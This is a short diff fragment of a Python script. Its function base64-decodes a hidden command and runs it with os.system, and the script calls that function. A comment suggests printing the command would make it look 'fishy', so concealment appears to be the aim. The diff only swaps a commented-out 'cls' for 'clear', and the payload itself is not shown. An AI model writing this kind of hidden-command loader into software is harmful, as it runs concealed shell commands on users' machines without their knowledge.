@@ -9,7 +9,7 @@ def xor_exec():
 	xor_conn = base64.b64decode(xor)
 	os.system(xor_conn.decode('utf-8'))
 	#print('{}'.format(xor_conn))			<<-- uncomment if you want it to be fishy :/
-	#os.system('cls')
+	#os.system('clear')
 	return
 
 xor_exec()
